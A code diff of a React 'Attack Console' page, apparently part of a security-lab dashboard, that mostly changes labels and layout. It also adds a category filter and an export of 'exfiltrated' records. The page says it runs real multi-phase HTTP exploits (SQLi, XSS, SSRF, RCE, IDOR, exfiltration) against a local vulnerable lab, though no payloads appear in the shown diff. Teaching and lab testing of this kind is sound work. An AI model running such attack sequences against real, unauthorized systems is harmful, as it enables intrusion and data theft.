-        addLog(mkLog('RECON', 'info', '   External servers do not expose these lab endpoints and will return 404 / CORS blocks.'))
+        addLog(mkLog('RECON', 'info', '   The Attack Console tests specific lab testbed endpoints.'))
       }
 
-      await sleep(250)
+      await sleep(200)
 
       await phaseRecon(base, signal)
       const authResult = await phaseAuthBypass(base, signal)
-      await phaseSQLi(base, signal)
+      await phaseWebExploitation(base, signal)
       await phaseIDOR(base, authResult, signal)
       await phaseCrypto(base, authResult, signal)
       await phaseDataExfil()
@@ -1088,45 +1401,70 @@ export default function AttackConsole() {
 
   const totalExfiltratedCount = stolen.reduce((a, s) => a + s.count, 0)
 
+  const filteredStolen = selectedCategory === 'ALL'
+    ? stolen
+    : stolen.filter(s => s.category === selectedCategory)
+
   // ─── Render ────────────────────────────────────────────────────────────────
   return (
     <div className="p-6 space-y-5 min-h-screen relative">
       {/* Header */}
-      <div className="flex items-center justify-between">
+      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
         <div className="flex items-center gap-3">
           <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-500/40 flex items-center justify-center">
-            <ShieldOff size={22} className="text-red-400" />
+            <Flame size={22} className="text-red-400" />
           </div>
           <div>
             <h1 className="text-2xl font-bold text-white flex items-center gap-2">
               Attack Console
+              <span className="text-xs px-2.5 py-0.5 rounded-full bg-orange-500/20 text-orange-300 border border-orange-500/30 font-mono">
+                Claude-Red Suite
+              </span>
               {running && (
                 <span className="inline-flex items-center gap-1.5 text-xs px-2.5 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30 animate-pulse">
                   <span className="w-1.5 h-1.5 rounded-full bg-red-400" /> LIVE EXPLOITATION
                 </span>
               )}
             </h1>
-            <p className="text-xs text-gray-400">Automated multi-phase penetration attack & exfiltration telemetry</p>
+            <p className="text-xs text-gray-400">
+              Autonomous multi-phase offensive security execution & data exfiltration telemetry (Academic Demonstration)
+            </p>
           </div>
         </div>
-        <button onClick={reset} className="qs-btn-secondary text-xs gap-1.5">
-          <RefreshCw size={13} /> Reset
-        </button>
+        <div className="flex items-center gap-2">
+          {stolen.length > 0 && (
+            <button
+              onClick={() => {
+                const blob = new Blob([JSON.stringify(stolen, null, 2)], { type: 'application/json' })
+                const url = URL.createObjectURL(blob)
+                const a = document.createElement('a')
+                a.href = url
+                a.download = `claude-red-attack-telemetry-${Date.now()}.json`
+                a.click()
+              }}
+              className="qs-btn-secondary text-xs gap-1.5 text-pink-300 border-pink-500/30"
+            >
+              <FileDown size={13} /> Export Forensic Bundle
+            </button>
+          )}
+          <button onClick={reset} className="qs-btn-secondary text-xs gap-1.5">
+            <RefreshCw size={13} /> Reset
+          </button>
+        </div>
       </div>
 
-      {/* Warning */}
+      {/* Authorized Boundary Notice */}
       <div className="qs-card border-yellow-500/30 bg-yellow-500/5 py-3">
         <div className="flex items-start gap-2.5">
           <AlertTriangle size={16} className="text-yellow-400 flex-shrink-0 mt-0.5" />
           <p className="text-xs text-yellow-200/80">
-            <strong className="text-yellow-300">Authorized targets only.</strong>{' '}
-            This console executes real HTTP penetration exploits against the configured URL.
-            Ensure you target your local <code className="bg-black/40 px-1.5 py-0.5 rounded text-yellow-300 font-mono">http://localhost:8080</code> vulnerable security lab.
+            <strong className="text-yellow-300">Authorized Academic Testbed:</strong>{' '}
+            Executes autonomous penetration testing techniques featured in the Claude-Red repository (Recon, Auth Bypass, SQLi, XSS, SSRF IMDS, Path Traversal, RCE, IDOR, Quantum Crypto). Target your local <code className="bg-black/40 px-1.5 py-0.5 rounded text-yellow-300 font-mono">http://localhost:8080</code> lab.
           </p>
         </div>
       </div>
 
-      {/* Target + Launch */}
+      {/* Target Input & Launch Control */}
       <div className="qs-card border-red-500/20">
         <div className="flex items-end gap-3">
           <div className="flex-1">
@@ -1155,14 +1493,14 @@ export default function AttackConsole() {
             <button
               id="launch-attack-btn"
               onClick={launchAttack}
-              className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold text-sm transition-all duration-200 shadow-lg shadow-red-900/30"
+              className="flex items-center gap-2 px-6 py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold text-sm transition-all duration-200 shadow-lg shadow-red-900/30"
             >
               <Zap size={16} /> LAUNCH ATTACK
             </button>
           ) : (
             <button
               onClick={abort}
-              className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 text-white font-semibold text-sm transition-all"
+              className="flex items-center gap-2 px-6 py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 text-white font-semibold text-sm transition-all"
             >
               <XCircle size={16} /> ABORT
             </button>
@@ -1173,7 +1511,7 @@ export default function AttackConsole() {
           <div className="mt-4">
             <div className="flex items-center justify-between mb-1.5">
               <span className={`text-xs font-mono font-bold ${PHASE_COLOR[phase]}`}>[{phase}]</span>
-              <span className="text-xs text-gray-400 font-mono">{Math.round(progress)}%</span>
+              <span className="text-xs text-gray-400 font-mono">{Math.round(progress)}% Complete</span>
             </div>
             <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
               <div
@@ -1185,15 +1523,16 @@ export default function AttackConsole() {
         )}
       </div>
 
-      {/* Main Grid */}
+      {/* Main Grid: Terminal + Exfiltrated Records / Phases */}
       <div className="grid grid-cols-1 xl:grid-cols-3 gap-5">
+        
         {/* Terminal (Left 2 cols) */}
-        <div className="xl:col-span-2 qs-card p-0 overflow-hidden flex flex-col" style={{ minHeight: 520 }}>
+        <div className="xl:col-span-2 qs-card p-0 overflow-hidden flex flex-col" style={{ minHeight: 560 }}>
           <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-800 bg-gray-900/80">
             <div className="flex items-center gap-2">
               <Terminal size={14} className="text-green-400" />
               <span className="text-xs font-mono text-green-400 font-semibold">attack-terminal</span>
-              <span className="text-[10px] text-gray-500 bg-black/40 px-2 py-0.5 rounded font-mono">Live Telemetry</span>
+              <span className="text-[10px] text-gray-500 bg-black/40 px-2 py-0.5 rounded font-mono">Claude-Red Live Stream</span>
             </div>
             <button
               className="text-gray-400 hover:text-white transition-colors text-xs flex items-center gap-1"
@@ -1207,21 +1546,22 @@ export default function AttackConsole() {
 
           <div
             className="flex-1 overflow-y-auto bg-[#080b11] p-4 font-mono text-xs leading-6 space-y-1"
-            style={{ maxHeight: 520 }}
+            style={{ maxHeight: 560 }}
           >
             {logs.length === 0 ? (
-              <div className="text-gray-600 select-none py-10 text-center font-mono">
+              <div className="text-gray-600 select-none py-14 text-center font-mono space-y-1">
                 <div>┌───────────────────────────────────────────────────────────────┐</div>
-                <div>│  Ready to launch attack sequence against local target.        │</div>
-                <div>│  Select target URL (e.g. http://localhost:8080) & launch.      │</div>
+                <div>│  QuantumShield AI — Claude-Red Attack Console Ready           │</div>
+                <div>│  Target URL: http://localhost:8080 (Vulnerable Lab)           │</div>
+                <div>│  Click [LAUNCH ATTACK] to trigger autonomous exploitation    │</div>
                 <div>└───────────────────────────────────────────────────────────────┘</div>
               </div>
             ) : (
               logs.map(entry => (
                 <div key={entry.id} className="flex gap-2">
                   <span className="text-gray-600 flex-shrink-0 w-20">[{entry.ts}]</span>
-                  <span className={`flex-shrink-0 w-28 font-semibold ${PHASE_COLOR[entry.phase]}`}>
-                    [{entry.phase.slice(0, 10)}]
+                  <span className={`flex-shrink-0 w-32 font-semibold ${PHASE_COLOR[entry.phase]}`}>
+                    [{entry.phase.slice(0, 11)}]
                   </span>
                   <span className={LEVEL_COLOR[entry.level]}>{entry.msg}</span>
                 </div>
@@ -1230,7 +1570,7 @@ export default function AttackConsole() {
             {running && (
               <div className="flex gap-2 mt-1">
                 <span className="text-gray-600 w-20">[{new Date().toLocaleTimeString()}]</span>
-                <span className={`w-28 font-semibold ${PHASE_COLOR[phase]}`}>[{phase.slice(0, 10)}]</span>
+                <span className={`w-32 font-semibold ${PHASE_COLOR[phase]}`}>[{phase.slice(0, 11)}]</span>
                 <span className="text-green-400 animate-pulse">▍</span>
               </div>
             )}
@@ -1238,7 +1578,7 @@ export default function AttackConsole() {
           </div>
         </div>
 
-        {/* Right Panel: Exfiltrated Data & Attack Phases with Techniques */}
+        {/* Right Panel: Exfiltrated Data Cards & Phases */}
         <div className="flex flex-col gap-4">
           
           {/* Exfiltrated Data Card */}
@@ -1246,7 +1586,7 @@ export default function AttackConsole() {
             <div className="flex items-center justify-between mb-3">
               <div className="flex items-center gap-2">
                 <Database size={16} className="text-pink-400" />
-                <h3 className="text-sm font-semibold text-white">Exfiltrated Data</h3>
+                <h3 className="text-sm font-semibold text-white">Exfiltrated Data Assets</h3>
               </div>
               {stolen.length > 0 && (
                 <span className="text-xs font-mono px-2.5 py-0.5 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/30">
@@ -1255,6 +1595,25 @@ export default function AttackConsole() {
               )}
             </div>
 
+            {/* Category Filter Pills */}
+            {stolen.length > 0 && (
+              <div className="flex items-center gap-1.5 pb-2 overflow-x-auto text-[10px] font-mono">
+                {['ALL', 'WEB', 'AUTH', 'RECON', 'ACCESS', 'CRYPTO'].map(cat => (
+                  <button
+                    key={cat}
+                    onClick={() => setSelectedCategory(cat)}
+                    className={`px-2 py-0.5 rounded-md border transition-colors ${
+                      selectedCategory === cat
+                        ? 'bg-pink-500/20 text-pink-300 border-pink-500/40 font-bold'
+                        : 'bg-gray-900 text-gray-400 border-gray-800 hover:text-white'
+                    }`}
+                  >
+                    {cat}
+                  </button>
+                ))}
+              </div>
+            )}
+
             {stolen.length === 0 ? (
               <div className="text-center py-12 text-gray-500 text-xs flex-1 flex flex-col items-center justify-center">
                 <Database size={36} className="mb-2 opacity-20 text-pink-400" />
@@ -1262,8 +1621,8 @@ export default function AttackConsole() {
                 <span className="text-[11px] text-gray-600 mt-1">Extracted data will populate live during attack</span>
               </div>
             ) : (
-              <div className="space-y-2.5 flex-1 overflow-y-auto max-h-[300px] pr-1">
-                {stolen.map(s => {
+              <div className="space-y-2.5 flex-1 overflow-y-auto max-h-[310px] pr-1">
+                {filteredStolen.map(s => {
                   const Icon = s.icon
                   return (
                     <div
@@ -1300,9 +1659,9 @@ export default function AttackConsole() {
                             </div>
                           )}
 
-                          {/* Click to inspect flow & remediation */}
+                          {/* Click to inspect */}
                           <div className="flex items-center gap-1 mt-1.5 text-[10px] text-pink-400/80 group-hover:text-pink-300 font-medium">
-                            <Eye size={11} /> View full data, flow & fix <ArrowRight size={10} className="group-hover:translate-x-0.5 transition-transform" />
+                            <Eye size={11} /> View payload, flow & fix <ArrowRight size={10} className="group-hover:translate-x-0.5 transition-transform" />
                           </div>
                         </div>
                       </div>
@@ -1319,11 +1678,11 @@ export default function AttackConsole() {
               <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
                 <Layers size={13} className="text-cyan-400" /> Attack Phases & Techniques
               </h3>
-              <span className="text-[10px] text-gray-500 font-mono">MITRE / OWASP</span>
+              <span className="text-[10px] text-gray-500 font-mono">Claude-Red / MITRE</span>
             </div>
 
             <div className="space-y-3">
-              {PHASE_CONFIG.map(({ phase: p, label, techniques }) => {
+              {PHASE_CONFIG.map(({ phase: p, label, claudeRedModule, techniques }) => {
                 const currentIdx = PHASE_ORDER.indexOf(phase)
                 const thisIdx = PHASE_ORDER.indexOf(p)
                 const isDone = currentIdx > thisIdx
@@ -1350,16 +1709,19 @@ export default function AttackConsole() {
                         ) : (
                           <div className="w-3.5 h-3.5 rounded-full border border-gray-700 flex-shrink-0" />
                         )}
-                        <span className={`text-xs font-semibold ${isDone ? 'text-green-400' : isActive ? PHASE_COLOR[p] : 'text-gray-400'}`}>
-                          {label}
-                        </span>
+                        <div>
+                          <span className={`text-xs font-semibold ${isDone ? 'text-green-400' : isActive ? PHASE_COLOR[p] : 'text-gray-400'}`}>
+                            {label}
+                          </span>
+                          <span className="text-[9px] text-gray-600 block font-mono">{claudeRedModule}</span>
+                        </div>
                       </div>
                       <span className="text-[10px] font-mono text-gray-500">
                         {isDone ? 'EXPLOITED' : isActive ? 'EXECUTING' : 'PENDING'}
                       </span>
                     </div>
 
-                    {/* Implemented Techniques Adjacent to Phase */}
+                    {/* Implemented Techniques */}
                     <div className="ml-5 flex flex-wrap gap-1.5 mt-1">
                       {techniques.map(tech => (
                         <div
@@ -1371,7 +1733,7 @@ export default function AttackConsole() {
                               ? 'bg-green-500/10 border-green-500/20 text-green-300'
                               : 'bg-gray-800/60 border-gray-800 text-gray-500'
                           }`}
-                          title={`${tech.cwe}: ${tech.desc}`}
+                          title={`${tech.cwe} (${tech.mitre}): ${tech.desc}`}
                         >
                           <span className="text-[9px] opacity-75 font-bold">[{tech.cwe}]</span>
                           <span>{tech.name}</span>
@@ -1387,23 +1749,23 @@ export default function AttackConsole() {
         </div>
       </div>
 
-      {/* Done banner */}
+      {/* Done Banner */}
       {done && (
-        <div className="qs-card border-green-500/30 bg-green-500/5 flex items-center justify-between py-4">
+        <div className="qs-card border-green-500/30 bg-green-500/5 flex flex-col md:flex-row md:items-center justify-between gap-3 py-4">
           <div className="flex items-center gap-3">
             <CheckCircle2 size={22} className="text-green-400 flex-shrink-0" />
             <div>
-              <div className="font-semibold text-green-300 text-sm">Autonomous Exploitation Sequence Complete</div>
+              <div className="font-semibold text-green-300 text-sm">Claude-Red Autonomous Exploitation Complete</div>
               <div className="text-xs text-gray-400 mt-0.5">
-                Exfiltrated <strong>{totalExfiltratedCount} records</strong> across <strong>{stolen.length} categories</strong>. Click any record card above to inspect extracted payloads, security flows, and defensive hardening fixes.
+                Exfiltrated <strong>{totalExfiltratedCount} records</strong> across <strong>{stolen.length} offensive attack categories</strong>. Click any record card to inspect injected payloads, step-by-step security flows, and defensive remediation code.
               </div>
             </div>
           </div>
           <button
             onClick={() => stolen.length > 0 && setSelectedRecord(stolen[0])}
-            className="qs-btn-secondary text-xs flex items-center gap-1.5 text-pink-300 border-pink-500/30"
+            className="qs-btn-secondary text-xs flex items-center gap-1.5 text-pink-300 border-pink-500/30 self-start md:self-auto"
           >
-            <Eye size={14} /> Review All Results
+            <Eye size={14} /> Review All Findings
           </button>
         </div>
       )}
@@ -1427,7 +1789,9 @@ export default function AttackConsole() {
                     </span>
                   </h2>
                   <p className="text-xs text-gray-400 font-mono flex items-center gap-2">
-                    <span>{selectedRecord.cwe}</span> · <span>Captured at {selectedRecord.timestamp}</span>
+                    <span>{selectedRecord.cwe}</span> · 
+                    {selectedRecord.mitre && <span>MITRE {selectedRecord.mitre} · </span>}
+                    <span>Captured at {selectedRecord.timestamp}</span>
                   </p>
                 </div>
               </div>
@@ -1464,17 +1828,17 @@ export default function AttackConsole() {
                 </div>
 
                 <div className="bg-gray-900/80 p-3.5 rounded-xl border border-gray-800 space-y-1">
-                  <div className="text-[11px] font-mono text-gray-400 uppercase tracking-wider">Exploited Technique & Vulnerability</div>
+                  <div className="text-[11px] font-mono text-gray-400 uppercase tracking-wider">Claude-Red Attack Skill & Technique</div>
                   <div className="text-xs font-semibold text-pink-300 mt-1">
                     {selectedRecord.technique}
                   </div>
                   <div className="text-[11px] text-gray-400 font-mono">
-                    {selectedRecord.cwe}
+                    {selectedRecord.claudeRedSkill || selectedRecord.cwe}
                   </div>
                 </div>
               </div>
 
-              {/* 2. What Information Was Exposed (Exposed Info Breakdown) */}
+              {/* 2. Exposed Info Breakdown */}
               <div className="space-y-3">
                 <div className="flex items-center gap-2">
                   <ShieldAlert size={16} className="text-red-400" />
@@ -1493,11 +1857,11 @@ export default function AttackConsole() {
                 </div>
               </div>
 
-              {/* 3. Security Hardening & Remediation Techniques (How to Fix) */}
+              {/* 3. Security Hardening & Remediation */}
               <div className="space-y-3">
                 <div className="flex items-center gap-2">
                   <ShieldCheck size={16} className="text-green-400" />
-                  <h3 className="text-sm font-semibold text-white">Techniques to Secure & Protect This URL</h3>
+                  <h3 className="text-sm font-semibold text-white">Defensive Hardening & Remediation</h3>
                 </div>
 
                 <div className="space-y-3">
@@ -1547,7 +1911,7 @@ export default function AttackConsole() {
                 </div>
               </div>
 
-              {/* 5. Injected Payload / Parameters */}
+              {/* 5. Injected Exploit Payload */}
               {selectedRecord.payload && (
                 <div className="space-y-2">
                   <div className="flex items-center justify-between">
@@ -1569,7 +1933,7 @@ export default function AttackConsole() {
                 </div>
               )}
 
-              {/* 6. Complete Extracted Data (Records View) */}
+              {/* 6. Complete Extracted Data (JSON Inspector) */}
               <div className="space-y-3">
                 <div className="flex items-center justify-between">
                   <div className="flex items-center gap-2">
@@ -1600,7 +1964,6 @@ export default function AttackConsole() {
                   </div>
                 </div>
 
-                {/* Formatted JSON / Table Viewer */}
                 <div className="bg-[#080b11] border border-gray-800 rounded-xl p-4 overflow-hidden">
                   <pre className="font-mono text-xs text-green-400 max-h-80 overflow-y-auto leading-relaxed">
                     {JSON.stringify(selectedRecord.records, null, 2)}
